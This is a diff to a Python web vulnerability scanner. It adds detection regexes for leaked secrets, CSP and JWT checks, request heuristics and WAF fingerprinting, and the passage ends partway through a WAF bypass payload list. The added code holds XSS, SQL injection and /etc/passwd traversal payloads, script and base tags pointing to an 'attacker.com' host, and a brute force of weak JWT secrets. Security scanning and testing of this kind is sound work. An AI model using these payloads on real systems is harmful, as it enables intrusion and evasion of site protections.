@@ -3,6 +3,11 @@ import urllib.parse
 import base64
 import json
 import math
+import time
+try:
+    import requests as _requests
+except ImportError:
+    _requests = None
 from utils.component_checker import ComponentChecker
 from utils.decryption.manager import DecryptionManager
 from utils.ast_deobfuscator import ASTDeobfuscator
@@ -14,6 +19,7 @@ class Analyzer:
         self.component_checker = None
         self.vuln_db = vuln_db
         self.component_checker = None
+        self.detected_waf = None
         if vuln_db:
             self.component_checker = ComponentChecker(vuln_db)
         
@@ -21,6 +27,122 @@ class Analyzer:
         self.ast_deobfuscator = ASTDeobfuscator()
         
         self.patterns = {
+
+            'AWS_ACCESS_KEY': {
+                'regex': r'(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}',
+                'severity': 'HIGH',
+                'description': 'AWS Access Key ID detected.',
+                'remediation': 'Revoke the key and use IAM roles.'
+            },
+            'AWS_SECRET_KEY': {
+                'regex': r'(?i)aws_(?:secret_)?(?:access_)?key(?:_id)?(?:["\']\s*[:=]\s*["\']|[:=]\s*["\']?)([0-9a-zA-Z/+]{40})(?:["\']?)',
+                'severity': 'CRITICAL',
+                'description': 'AWS Secret Access Key detected.',
+                'remediation': 'Rotate this key immediately and store secrets securely.'
+            },
+            'RSA_PRIVATE_KEY': {
+                'regex': r'-----BEGIN RSA PRIVATE KEY-----',
+                'severity': 'CRITICAL',
+                'description': 'RSA Private Key detected.',
+                'remediation': 'Rotate keys immediately and store secrets securely.'
+            },
+            'SSH_DSA_PRIVATE_KEY': {
+                'regex': r'-----BEGIN DSA PRIVATE KEY-----',
+                'severity': 'CRITICAL',
+                'description': 'SSH DSA Private Key detected.',
+                'remediation': 'Rotate keys immediately and store secrets securely.'
+            },
+            'SSH_EC_PRIVATE_KEY': {
+                'regex': r'-----BEGIN EC PRIVATE KEY-----',
+                'severity': 'CRITICAL',
+                'description': 'SSH EC Private Key detected.',
+                'remediation': 'Rotate keys immediately and store secrets securely.'
+            },
+            'PGP_PRIVATE_BLOCK': {
+                'regex': r'-----BEGIN PGP PRIVATE KEY BLOCK-----',
+                'severity': 'CRITICAL',
+                'description': 'PGP Private Key Block detected.',
+                'remediation': 'Rotate keys immediately and store secrets securely.'
+            },
+            'JSON_WEB_TOKEN': {
+                'regex': r'ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
+                'severity': 'HIGH',
+                'description': 'Potential JWT Token detected.',
+                'remediation': 'Ensure tokens are not hardcoded or leaked.'
+            },
+            'MAILGUN_API_KEY': {
+                'regex': r'key-[0-9a-zA-Z]{32}',
+                'severity': 'HIGH',
+                'description': 'Mailgun API Key detected.',
+                'remediation': 'Revoke the key and use environment variables.'
+            },
+            'TWILIO_API_KEY': {
+                'regex': r'SK[0-9a-fA-F]{32}',
+                'severity': 'HIGH',
+                'description': 'Twilio API Key detected.',
+                'remediation': 'Revoke the key and use environment variables.'
+            },
+            'SQUARE_ACCESS_TOKEN': {
+                'regex': r'sq0atp-[0-9A-Za-z\-_]{22}',
+                'severity': 'HIGH',
+                'description': 'Square Access Token detected.',
+                'remediation': 'Revoke the token and use environment variables.'
+            },
+            'SQUARE_OAUTH_SECRET': {
+                'regex': r'sq0csp-[0-9A-Za-z\-_]{43}',
+                'severity': 'HIGH',
+                'description': 'Square OAuth Secret detected.',
+                'remediation': 'Revoke the secret and use environment variables.'
+            },
+            'PAYPAL_BRAINTREE_ACCESS_TOKEN': {
+                'regex': r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
+                'severity': 'HIGH',
+                'description': 'PayPal Braintree Access Token detected.',
+                'remediation': 'Revoke the token and use environment variables.'
+            },
+            'PICQER_API_KEY': {
+                'regex': r'piq_[0-9a-zA-Z]{5,}',
+                'severity': 'HIGH',
+                'description': 'Picqer API Key detected.',
+                'remediation': 'Revoke the key and use environment variables.'
+            },
+            'SHOPIFY_ACCESS_TOKEN': {
+                'regex': r'shpat_[0-9a-fA-F]{32}',
+                'severity': 'HIGH',
+                'description': 'Shopify Access Token detected.',
+                'remediation': 'Revoke the token and use environment variables.'
+            },
+            'SLACK_WEBHOOK': {
+                'regex': r'https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}',
+                'severity': 'HIGH',
+                'description': 'Slack Webhook detected.',
+                'remediation': 'Revoke the webhook and use environment variables.'
+            },
+            'HEROKU_API_KEY': {
+                'regex': r'[hH]eroku.{0,30}[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
+                'severity': 'HIGH',
+                'description': 'Heroku API Key detected.',
+                'remediation': 'Revoke the key and use environment variables.'
+            },
+            'FACEBOOK_ACCESS_TOKEN': {
+                'regex': r'EAACEdEose0cBA[0-9A-Za-z]+',
+                'severity': 'HIGH',
+                'description': 'Facebook Access Token detected.',
+                'remediation': 'Revoke the token and use environment variables.'
+            },
+            'TWITTER_CLIENT_ID': {
+                'regex': r'(?i)twitter(.{0,20})?[\'"][0-9a-zA-Z]{18,25}["\']',
+                'severity': 'MEDIUM',
+                'description': 'Twitter Client ID detected.',
+                'remediation': 'Verify if this ID is intended to be public.'
+            },
+            'TWITTER_SECRET_KEY': {
+                'regex': r'(?i)twitter(.{0,20})?[\'"][0-9a-zA-Z]{35,44}["\']',
+                'severity': 'HIGH',
+                'description': 'Twitter Secret Key detected.',
+                'remediation': 'Revoke the key and use environment variables.'
+            },
+
             'API_KEY_AWS': {
                 'pattern': r'(?<![A-Z0-9])[A-Z0-9]{20}(?![A-Z0-9])', # Simplified, usually AKIA...
                 'regex': r'AKIA[0-9A-Z]{16}',
@@ -40,55 +162,7 @@ class Analyzer:
                 'description': 'Private Key detected.',
                 'remediation': 'Rotate keys immediately and store secrets securely.'
             },
-            'DANGEROUS_JS_EVAL': {
-                'regex': r'\beval\(',
-                'severity': 'HIGH',
-                'description': 'Use of eval() detected.',
-                'remediation': 'Avoid eval(); use JSON.parse() or safer alternatives.'
-            },
-            'DANGEROUS_JS_DOCWRITE': {
-                'regex': r'document\.write\(',
-                'severity': 'MEDIUM',
-                'description': 'Use of document.write() detected.',
-                'remediation': 'Use DOM manipulation methods like appendChild().'
-            },
-            'DANGEROUS_JS_INNERHTML': {
-                'regex': r'\.innerHTML\s*=',
-                'severity': 'MEDIUM',
-                'description': 'Unsafe innerHTML assignment.',
-                'remediation': 'Use textContent or sanitize input.'
-            },
-            'SENSITIVE_COMMENT': {
-                'regex': r'(TODO|FIXME|HACK|XXX):',
-                'severity': 'INFO',
-                'description': 'Developer comment detected.',
-                'remediation': 'Review comments for sensitive info before deployment.'
-            },
             'USER_REQUESTED_KEY': {
-                'regex': r'[367]x![\w@#$%^&*!.-]{5,100}',
-                'severity': 'CRITICAL',
-                'description': 'User-specified key pattern (starting with 3x!, 6x!, or 7x!) detected.',
-                'remediation': 'Rotate this key immediately.'
-            },
-            'JS_ATOB_DECODE': {
-                'regex': r'atob\s*\(\s*["\']([A-Za-z0-9+/=_ -]{10,})["\']\s*\)',
-                'severity': 'HIGH',
-                'description': 'JavaScript atob() call with Base64 string detected.',
-                'remediation': 'Investigate the decoded content for secrets.'
-            },
-            'PASSWORD_FIELD': {
-                'regex': r'type=["\']password["\']',
-                'severity': 'LOW',
-                'description': 'Password field detected (Info).',
-                'remediation': 'Ensure forms are served over HTTPS.'
-            },
-            'POTENTIAL_XSS_SINK': {
-                'regex': r'location\.hash|location\.search|document\.cookie',
-                'severity': 'MEDIUM',
-                'description': 'Potential XSS sink detected.',
-                'remediation': 'Validate and sanitize data from these sources.'
-            },
-            'CUSTOM_KEY_SYMBOLS': {
                 'regex': r'\$785%\$#\*\*5#@!7\^#',
                 'severity': 'HIGH',
                 'description': 'Custom Pattern Symbols detected.',
@@ -148,20 +222,6 @@ class Analyzer:
                 'description': 'URL path being constructed dynamically with /api/.',
                 'remediation': 'Review dynamic URL construction for potential exposure.'
             },
-            'SENSITIVE_API_PATH': {
-                'regex': r'/(api|v1|v2|graphql|swagger|admin)/',
-                'severity': 'INFO',
-                'confidence': '95%',
-                'description': 'Sensitive API or Admin path detected.',
-                'remediation': 'Ensure endpoints are secured.'
-            },
-            'SUSPICIOUS_CRYPTO_KEYWORD': {
-                'regex': r'\b(crypto|encrypt|decrypt|decode|encode|cipher|key)\b',
-                'severity': 'INFO',
-                'confidence': '60%',
-                'description': 'Cryptography keyword detected.',
-                'remediation': 'Verify strong cryptography usage.'
-            },
             'HARDCODED_ENCRYPT_KEY': {
                 'regex': r'\b(encryptkey|secret|token|auth_key|api_key|access_key|private_key|secret_key)\b\s*[:=]\s*["\'][\w-]{5,}["\']',
                 'severity': 'HIGH',
@@ -169,26 +229,12 @@ class Analyzer:
                 'description': 'Potential hardcoded secret key.',
                 'remediation': 'Store secrets in environment variables.'
             },
-            'GENERIC_KEY_ASSIGNMENT': {
-                'regex': r'\b(k|kek|key)\b\s*[:=]\s*["\']?([\w\-]{6,})["\']?',
-                'severity': 'MEDIUM',
-                'confidence': '70%',
-                'description': 'Short-name key/secret assignment detected.',
-                'remediation': 'Verify if this value is sensitive.'
-            },
             'CRYPTOJS_AES_ENCRYPT': {
                 'regex': r'CryptoJS\.AES\.encrypt\([^,]+,\s*["\']([^"\']+)["\']',
                 'severity': 'CRITICAL',
                 'confidence': '99%',
                 'description': 'Hardcoded AES Key in CryptoJS detected.',
                 'remediation': 'Do not hardcode keys in client-side code.'
-            },
-            'SUSPICIOUS_FUNC_ARG_KEY': {
-                'regex': r'\(\s*[^,]+,\s*["\']([a-zA-Z0-9]{16}|[a-zA-Z0-9]{24}|[a-zA-Z0-9]{32})["\']\s*\)',
-                'severity': 'HIGH',
-                'confidence': '50%',
-                'description': 'Suspicious function argument (potential hardcoded key/IV).',
-                'remediation': 'Verify if this string is a secret.'
             },
             'NUMERIC_PARTS_KEY_GEN': {
                 'regex': r'numericParts\s*=\s*\[(\d+,\s*)+\d+\]',
@@ -198,7 +244,7 @@ class Analyzer:
                 'remediation': 'Do not use predictable client-side key generation.'
             },
             'HARDCODED_KEY_VAR': {
-                'regex': r'\b(aesValu|aesiv|juKu|iv)\b\s*=',
+                'regex': r'\b(aesValu|aesiv|juKu)\b\s*=',
                 'severity': 'HIGH',
                 'confidence': '80%',
                 'description': 'Potential hardcoded/dynamic key variable assignment.',
@@ -210,13 +256,6 @@ class Analyzer:
                 'confidence': '85%',
                 'description': 'Suspicious Base64 string (potential encoded key starting with 7x...).',
                 'remediation': 'Decode and verify if this is a hardcoded secret.'
-            },
-            'SENSITIVE_FILE_EXPOSURE': {
-                'regex': r'([\w\-./]*\.(env|bak|bkp|old|tmp|sql|dump|db|pem|crt|key|git|svn|ds_store|zip|tar|gz|rar|7z))|\b(config\.php|wp-config\.php|settings\.py|database\.yml|appsettings\.json|web\.config|httpd\.conf|nginx\.conf|php\.ini)\b|(/etc/(passwd|shadow))',
-                'severity': 'MEDIUM',
-                'confidence': '90%',
-                'description': 'Reference to a potentially sensitive file/path detected.',
-                'remediation': 'Ensure these files are not publicly accessible.'
             },
             'STRIPE_API_KEY': {
                 'regex': r'(?i)stripe(.{0,20})?["\']?(sk_live_[0-9a-zA-Z]{24})',
@@ -271,7 +310,105 @@ class Analyzer:
             entropy += - p_x * math.log(p_x, 2)
         return entropy
 
-    def scan(self, response_data, network_urls=None):
+    def _check_csp(self, url, headers, source):
+        if not headers: return
+        csp_header = None
+        for k, v in headers.items():
+            if k.lower() == 'content-security-policy':
+                csp_header = v
+                break
+        if not csp_header:
+            f = {
+                'url': url, 'type': 'MISSING_CSP', 'severity': 'LOW',
+                'description': 'Content-Security-Policy header is missing entirely.',
+                'remediation': 'Implement a strict CSP to mitigate XSS and data injection attacks.',
+                'match': 'No CSP Header', 'context': 'Response Headers', 'line': 0, 'source': source
+            }
+            if f not in self.findings: self.findings.append(f)
+            return
+            
+        csp = csp_header.lower()
+        misconfigs = []
+        payloads = []
+        
+        # Parse directives into a dictionary for precise checking
+        directives = {}
+        for directive in csp.split(';'):
+            directive = directive.strip()
+            if not directive: continue
+            parts = directive.split()
+            directives[parts[0]] = parts[1:] if len(parts) > 1 else []
+
+        script_src = directives.get('script-src', directives.get('default-src', []))
+        object_src = directives.get('object-src', directives.get('default-src', []))
+        base_uri = directives.get('base-uri', [])
+        frame_ancestors = directives.get('frame-ancestors', [])
+
+        # 1. Unsafe Inline
+        if "'unsafe-inline'" in script_src:
+            misconfigs.append("Allows inline scripts ('unsafe-inline' in script-src).")
+            payloads.append("Basic XSS: \"><script>alert(1)</script>")
+            payloads.append("Event Handler: \" autofocus onfocus=alert(1)")
+
+        # 2. Unsafe Eval
+        if "'unsafe-eval'" in script_src:
+            misconfigs.append("Allows string-to-code execution ('unsafe-eval' in script-src).")
+            payloads.append("Eval Execution: eval('alert(1)')")
+            payloads.append("SetTimeout Execution: setTimeout('alert(1)', 500)")
+
+        # 3. Wildcards & Broad Origins
+        if '*' in script_src or 'https://*' in script_src or 'http://*' in script_src:
+            misconfigs.append("Wildcard origin in script-src allows loading scripts from anywhere.")
+            payloads.append("External Script: \"><script src=\"https://attacker.com/evil.js\"></script>")
+
+        # 4. Insecure Schemes
+        if any(scheme in script_src for scheme in ['data:', 'http:', 'https:']):
+            misconfigs.append("Insecure URI scheme in script-src (data:, http:, or https:).")
+            payloads.append("Data URI Execution: \"><script src=\"data:text/javascript,alert(1)\"></script>")
+
+        # 5. Missing object-src
+        if not object_src or ('*' in object_src and "'none'" not in object_src):
+            misconfigs.append("Missing or permissive object-src (allows Flash/PDF/Applet injection).")
+            payloads.append("Plugin Injection: <object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>")
+
+        # 6. Missing base-uri
+        if not base_uri or '*' in base_uri:
+            misconfigs.append("Missing or permissive base-uri (allows base tag injection to hijack relative URLs).")
+            payloads.append("Base Hijack: \"><base href=\"https://attacker.com\">")
+
+        # 7. Known Bypassable CDNs (JSONP endpoints)
+        vulnerable_cdns = ['ajax.googleapis.com', 'cdnjs.cloudflare.com', 'unpkg.com', 'jsdelivr.net', 'code.jquery.com']
+        found_cdns = [cdn for cdn in vulnerable_cdns if any(cdn in src for src in script_src)]
+        if found_cdns:
+            misconfigs.append(f"Allows loading scripts from CDNs known to host JSONP endpoints or outdated Angular libraries: {', '.join(found_cdns)}")
+            payloads.append("JSONP Bypass (Example): \"><script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js\"></script><div ng-app>{{$eval.constructor('alert(1)')()}}</div>")
+
+        # 8. Strict-Dynamic without backward compatibility
+        if "'strict-dynamic'" in script_src and not any("nonce-" in src for src in script_src) and not any("sha256-" in src for src in script_src):
+            misconfigs.append("'strict-dynamic' used without a nonce or hash, which may break security or fail open.")
+
+        # 9. Clickjacking Protection (frame-ancestors)
+        if not frame_ancestors:
+            misconfigs.append("Missing frame-ancestors directive (vulnerable to Clickjacking if X-Frame-Options is also missing).")
+            payloads.append("Clickjacking PoC: <iframe src=\"{url}\"></iframe>")
+
+        if misconfigs:
+            severity = 'HIGH' if ("'unsafe-inline'" in script_src or '*' in script_src) else 'MEDIUM'
+            f = {
+                'url': url,
+                'type': 'CSP_MISCONFIGURATION_ADVANCED',
+                'severity': severity,
+                'description': 'Advanced CSP Analysis detected weaknesses:\\n- ' + '\\n- '.join(misconfigs) + '\\n\\nExploitation Payloads & Techniques:\\n- ' + '\\n- '.join(payloads),
+                'remediation': "Implement a strict, nonce-based CSP. Restrict script-src, set object-src 'none', set base-uri 'none', and use frame-ancestors to prevent clickjacking.",
+                'match': csp_header,
+                'context': 'Content-Security-Policy Analysis',
+                'line': 0,
+                'source': source
+            }
+            if f not in self.findings:
+                self.findings.append(f)
+
+    def scan(self, response_data, network_urls=None, headers=None):
         """
         Main analysis method.
         Analyzes the given response dictionary ({url: body_content}) for vulnerabilities.
@@ -283,6 +420,9 @@ class Analyzer:
         for url, content in response_data.items():
             print(f"[*] Scanning {url}...")
             source = 'NETWORK' if url in network_urls else 'STATIC'
+            
+            # 0. Check Content Security Policy (CSP)
+            self._check_csp(url, headers, source)
             
             # 1. Check for reflected inputs from the URL itself
             self._check_reflection(url, content, source)
@@ -304,7 +444,7 @@ class Analyzer:
 
             # 3. Check for known vulnerabilities in components
             if self.component_checker:
-                comp_findings = self.component_checker.check(url, content)
+                comp_findings = self.component_checker.check(url, content, headers=headers)
                 for f in comp_findings:
                     f['source'] = source
                     if f not in self.findings:
@@ -359,6 +499,8 @@ class Analyzer:
                         jwt_details = ""
                         if name == 'JWT_TOKEN':
                             try:
+                                import hmac
+                                import hashlib
                                 parts = match_str.split('.')
                                 if len(parts) == 3:
                                     # Fix padding
@@ -368,11 +510,35 @@ class Analyzer:
                                     header = json.loads(base64.urlsafe_b64decode(header_b64).decode())
                                     payload = json.loads(base64.urlsafe_b64decode(payload_b64).decode())
                                     
-                                    jwt_details = f"\n[+] Extracted Payload: {json.dumps(payload)[:100]}...\n"
-                                    if header.get('alg', '').lower() == 'none':
+                                    alg = header.get('alg', '').upper()
+                                    jwt_details = f"\n[+] Extracted Payload: {json.dumps(payload)[:100]}...\n[+] Algorithm: {alg}\n"
+                                    
+                                    if alg.lower() == 'none':
                                         jwt_details += "[!] CRITICAL: JWT accepts 'none' signing algorithm!"
                                         data['severity'] = 'CRITICAL'
                                         data['confidence'] = '99%'
+                                    elif alg == 'HS256':
+                                        # Brute-force common weak secrets
+                                        common_secrets = ['secret', '123456', 'password', 'admin', 'key', 'test']
+                                        msg = f"{parts[0]}.{parts[1]}".encode('utf-8')
+                                        signature = base64.urlsafe_b64decode(parts[2] + '=' * (-len(parts[2]) % 4))
+                                        
+                                        cracked_secret = None
+                                        for secret in common_secrets:
+                                            expected_mac = hmac.new(secret.encode('utf-8'), msg, hashlib.sha256).digest()
+                                            if hmac.compare_digest(expected_mac, signature):
+                                                cracked_secret = secret
+                                                break
+                                                
+                                        if cracked_secret:
+                                            jwt_details += f"[!!!] CRITICAL: JWT signed with extremely weak/default secret: '{cracked_secret}'"
+                                            data['severity'] = 'CRITICAL'
+                                            data['confidence'] = '100%'
+                                            data['description'] = "JWT Token uses a highly vulnerable default secret. Token forgery is possible."
+                                            
+                                    # Check for weak HMAC algorithms (HS128, etc) or missing exp/iat
+                                    if 'exp' not in payload:
+                                        jwt_details += "[-] Note: Token does not have an 'exp' (expiration) claim."
                             except Exception:
                                 pass
 
@@ -440,6 +606,26 @@ class Analyzer:
         # Comma-separated binary-like numbers: "1010100,1101010,..."
         binary_csv_regex = r'["\']((?:[01]{7,8},)+[01]{7,8})["\']'
         binary_csvs = re.findall(binary_csv_regex, content)
+        
+        # Deep API/REST Endpoint Discovery
+        api_discovery_regex = r'["\'](/(?:api|v[1-9]|rest|graphql|swagger|openapi)[/"\'][^"\']*)["\']'
+        api_endpoints = re.findall(api_discovery_regex, content)
+        for ep in set(api_endpoints):
+            # Exclude very short noisy matches
+            if len(ep) > 5:
+                line_idx = content.find(ep)
+                line_num = content[:line_idx].count('\n') + 1 if line_idx != -1 else 0
+                self.findings.append({
+                    'url': url,
+                    'type': 'API_ENDPOINT_DISCOVERED',
+                    'severity': 'INFO',
+                    'description': 'Discovered a hardcoded API, GraphQL, or Swagger endpoint.',
+                    'remediation': 'Ensure the endpoint requires proper authentication and is intended for client-side exposure.',
+                    'match': ep,
+                    'context': f"Discovered Endpoint: {ep}",
+                    'line': line_num,
+                    'source': source
+                })
         
         sensitive_keywords = ['/api/public', '/api/', 'http://', 'https://']
         found_decoded = []
@@ -745,6 +931,836 @@ class Analyzer:
                             'param': param,
                         }
                         self.findings.append(finding)
+
+    def scan_request(self, url, method='GET', headers=None, body=None, network_urls=None):
+        """
+        Analyzes an OUTGOING request (method/headers/body) — the counterpart to scan().
+        scan() only ever sees response bodies and URL query strings; this method covers
+        what scan() structurally cannot reach: POST/PUT/PATCH bodies, request headers,
+        and body-encoded parameters (form-urlencoded, multipart, JSON).
+        Returns a list of new finding dictionaries.
+        """
+        new_findings = []
+        headers = headers or {}
+        source = 'NETWORK_REQUEST'
+        headers_lower = {k.lower(): v for k, v in headers.items()}
+
+        # 1. Auth / session material in request headers
+        auth_header_names = ['authorization', 'x-api-key', 'x-auth-token', 'x-session-token', 'cookie']
+        for hname in auth_header_names:
+            if hname in headers_lower and headers_lower[hname]:
+                hval = headers_lower[hname]
+                severity = 'INFO'
+                desc = f'Request header "{hname}" sent to in-scope target.'
+                if hname == 'authorization' and 'bearer' in hval.lower():
+                    severity = 'MEDIUM'
+                    desc = 'Bearer token observed in outgoing Authorization header.'
+                elif hname == 'cookie' and any(s in hval.lower() for s in ['session', 'auth', 'token', 'sid=']):
+                    severity = 'LOW'
+                    desc = 'Session/auth cookie observed on outgoing request — verify Secure/HttpOnly/SameSite on Set-Cookie.'
+                f = {
+                    'url': url, 'method': method, 'type': 'REQUEST_AUTH_MATERIAL',
+                    'severity': severity, 'description': desc,
+                    'remediation': 'Ensure tokens are scoped, short-lived, and never logged; verify cookie flags.',
+                    'match': f'{hname}: {hval[:80]}', 'context': f'{method} {url}', 'line': 0, 'source': source
+                }
+                if f not in self.findings:
+                    self.findings.append(f); new_findings.append(f)
+
+        # 2. Missing CSRF protection heuristic on state-changing requests
+        if method.upper() in ('POST', 'PUT', 'PATCH', 'DELETE'):
+            csrf_header_present = any(h in headers_lower for h in
+                ['x-csrf-token', 'x-xsrf-token', 'csrf-token', 'x-requested-with'])
+            body_has_csrf_field = bool(body) and bool(re.search(r'csrf|_token|authenticity_token', body, re.IGNORECASE))
+            if not csrf_header_present and not body_has_csrf_field:
+                f = {
+                    'url': url, 'method': method, 'type': 'MISSING_CSRF_TOKEN',
+                    'severity': 'LOW',
+                    'description': f'{method} request carries no recognizable CSRF token (header or body field).',
+                    'remediation': 'Confirm server-side CSRF validation (e.g. SameSite cookies, double-submit token, custom header check).',
+                    'match': f'{method} {url}', 'context': 'No csrf/_token/authenticity_token field or anti-CSRF header found',
+                    'line': 0, 'source': source
+                }
+                if f not in self.findings:
+                    self.findings.append(f); new_findings.append(f)
+
+        # 3. Parse body params (JSON / form-urlencoded) into (param, value) pairs
+        body_params = []
+        if body:
+            stripped = body.strip()
+            try:
+                if stripped.startswith('{') or stripped.startswith('['):
+                    parsed = json.loads(stripped)
+                    body_params = list(self._flatten_json_params(parsed))
+                else:
+                    qs = urllib.parse.parse_qs(stripped, keep_blank_values=True)
+                    body_params = [(k, v) for k, vals in qs.items() for v in vals]
+            except Exception:
+                pass
+
+        suspicious_params = ['id', 'user', 'account', 'profile', 'order', 'invoice', 'report', 'doc',
+                              'file', 'key', 'token', 'uid', 'uuid', 'pid', 'item', 'customer',
+                              'transaction', 'member', 'group', 'role', 'admin', 'isadmin', 'is_admin']
+        ssrf_lfi_params = ['file', 'path', 'dir', 'document', 'folder', 'root', 'page', 'doc', 'load', 'read', 'url']
+
+        for param, value in body_params:
+            if not isinstance(value, str):
+                value = str(value)
+            param_lower = param.lower()
+            is_suspicious_name = any(s in param_lower for s in suspicious_params) or param_lower.endswith('id')
+
+            # IDOR-style numeric/UUID identifiers in body
+            if is_suspicious_name and value.isdigit():
+                f = {
+                    'url': url, 'method': method, 'type': 'POTENTIAL_IDOR_BODY_PARAM',
+                    'severity': 'MEDIUM',
+                    'description': f'Potential IDOR (numeric) in request body field "{param}".',
+                    'remediation': 'Verify server-side authorization, not just that the field exists client-side.',
+                    'match': f'{param}={value}', 'context': f'{method} {url}', 'line': 0, 'source': source
+                }
+                if f not in self.findings:
+                    self.findings.append(f); new_findings.append(f)
+
+            # Privilege-flag tampering candidates (role/isAdmin-style fields client can set)
+            if param_lower in ('role', 'isadmin', 'is_admin', 'admin', 'permissions', 'scope'):
+                f = {
+                    'url': url, 'method': method, 'type': 'CLIENT_CONTROLLED_PRIVILEGE_FIELD',
+                    'severity': 'HIGH',
+                    'description': f'Request body includes client-settable privilege-like field "{param}".',
+                    'remediation': 'Privilege/role must be derived server-side from the authenticated session, never trusted from the client.',
+                    'match': f'{param}={value}', 'context': f'{method} {url}', 'line': 0, 'source': source
+                }
+                if f not in self.findings:
+                    self.findings.append(f); new_findings.append(f)
+
+            # SSRF/LFI-style path or URL fields in body
+            if param_lower in ssrf_lfi_params and ('/' in value or '\\' in value or value.lower().startswith('http')):
+                f = {
+                    'url': url, 'method': method, 'type': 'POTENTIAL_SSRF_LFI_BODY_PARAM',
+                    'severity': 'HIGH',
+                    'description': f'Potential SSRF/LFI body field "{param}" accepts a path or URL.',
+                    'remediation': 'Validate against an allowlist server-side; never resolve client-supplied URLs/paths directly.',
+                    'match': f'{param}={value}', 'context': f'{method} {url}', 'line': 0, 'source': source
+                }
+                if f not in self.findings:
+                    self.findings.append(f); new_findings.append(f)
+
+        return new_findings
+
+    def check_waf(self, status_code, headers, body, url):
+        """
+        Detects WAF vendor from response headers, cookies, and body signatures.
+        Stores detected WAF in self.detected_waf. Returns a finding dict or None.
+        Detects: Cloudflare, Akamai, AWS WAF, ModSecurity, Imperva, F5 BigIP.
+        """
+        is_blocked = False
+        waf_name = None
+
+        headers_lower = {k.lower(): v for k, v in (headers or {}).items()}
+        headers_lower_vals = {k: v.lower() for k, v in headers_lower.items()}
+        cookies_str = headers_lower.get('set-cookie', '')
+        body_decoded = body.decode('utf-8', errors='ignore') if isinstance(body, bytes) else (body or '')
+        body_str = body_decoded.lower()
+
+        # --- Vendor Fingerprinting (regardless of status code) ---
+
+        # 1. Cloudflare: cf-ray header
+        if 'cf-ray' in headers_lower:
+            waf_name = 'Cloudflare'
+
+        # 2. Akamai: AkamaiGHost in Server or Via header, or body signature
+        elif 'akamaighost' in headers_lower_vals.get('server', '') or \
+             'akamaighost' in headers_lower_vals.get('via', '') or \
+             ('access denied' in body_str and 'reference #' in body_str):
+            waf_name = 'Akamai'
+
+        # 3. AWS WAF: x-amzn-requestid header
+        elif 'x-amzn-requestid' in headers_lower or 'x-amzn-trace-id' in headers_lower:
+            waf_name = 'AWS WAF'
+
+        # 4. ModSecurity: Mod_Security in body or Server header
+        elif 'mod_security' in body_str or 'modsecurity' in body_str or \
+             'mod_security' in headers_lower_vals.get('server', ''):
+            waf_name = 'ModSecurity'
+
+        # 5. Imperva: incap_ses cookie
+        elif 'incap_ses' in cookies_str or 'incapsula' in cookies_str or \
+             'x-iinfo' in headers_lower or 'incapsula incident id' in body_str:
+            waf_name = 'Imperva'
+
+        # 6. F5 BigIP: BIGipServer cookie
+        elif 'bigipserver' in cookies_str.lower() or \
+             'f5' in headers_lower_vals.get('server', '') or \
+             'big-ip' in headers_lower_vals.get('server', ''):
+            waf_name = 'F5 BigIP'
+
+        # Fallback: check status + body/server for generic WAF
+        elif status_code in [403, 406, 429, 503, 422]:
+            if 'cloudflare' in body_str and 'ray id' in body_str:
+                waf_name = 'Cloudflare'
+            elif 'request blocked' in body_str or 'security policy' in body_str:
+                waf_name = 'Generic WAF'
+            elif 'cloudflare' in headers_lower_vals.get('server', ''):
+                waf_name = 'Cloudflare'
+            elif 'awselb' in headers_lower_vals.get('server', '') or \
+                 'amazoncf' in headers_lower_vals.get('server', ''):
+                waf_name = 'AWS WAF'
+
+        if waf_name:
+            self.detected_waf = waf_name
+            is_blocked = status_code in [403, 406, 429, 503, 422]
+            bypass_techniques = self.get_waf_bypass_payloads(waf_name, 'all')
+
+            f = {
+                'url': url,
+                'type': 'WAF_FINGERPRINTED',
+                'severity': 'INFO',
+                'description': f'WAF Detected: {waf_name}. Status: {status_code}.',
+                'remediation': 'Use vendor-specific bypass payloads to validate underlying vulnerabilities.',
+                'match': f'{waf_name} (Status: {status_code})',
+                'context': bypass_techniques,
+                'line': 0,
+                'source': 'NETWORK'
+            }
+            if f not in self.findings:
+                self.findings.append(f)
+            return f
+
+        return None
+
+    def get_waf_bypass_payloads(self, waf_name, payload_type='all'):
+        """
+        Returns vendor-specific WAF bypass payloads as a formatted string.
+        payload_type: 'sqli', 'xss', 'lfi', 'all'
+        """
+        payloads = {
+            'Cloudflare': {
+                'sqli': [
+                    "1'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
+                    "1' AND 1=1--",
+                    "1'%0aUNION%0aSELECT%0aNULL--",
+                    "1' /*!50000UNION*/ SELECT NULL--",
+                    "%27%20UNION%20SELECT%20NULL--",
+                ],
+                'xss': [
+                    "<svg/onload=alert`1`>",
+                    "<img src=x onerror=\"alert(1)\">",
+                    "%3Csvg%2Fonload%3Dalert(1)%3E",
+                    "<details open ontoggle=alert(1)>",
+                    "javascript:/*--></title></style></textarea></script><svg/onload='/*`*/alert(1)//'>",
+                ],
+                'lfi': [
+                    "....//....//....//etc/passwd",
+                    "..%2f..%2f..%2fetc%2fpasswd",
+                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                    "..%252f..%252f..%252fetc%252fpasswd",
+                ],
+            },
+            'Akamai': {
+                'sqli': [
+                    "1'/*! UNION *//*! SELECT */NULL--",
+                    "1'%09UNION%09SELECT%09NULL--",
+                    "1' UNION%0ASELECT NULL,NULL--",
+                    "1'%0BUNION%0BSELECT%0BNULL--",
+                ],
+                'xss': [
+                    "<ScRiPt>alert(1)</ScRiPt>",
+                    "<img/src=x onerror=alert(1)>",
+                    "';alert(1)//",
+                    "<body onpageshow=alert(1)>",
+                    "<iframe srcdoc='<svg onload=alert(1)>'>",
+                ],
+                'lfi': [
+                    "..%c0%afetc%c0%afpasswd",
+                    "..//..//..//etc//passwd",
+                    "%2e%2e/%2e%2e/etc/passwd",
+                ],
+            },
+            'AWS WAF': {
+                'sqli': [
+                    "1' OR '1'='1",
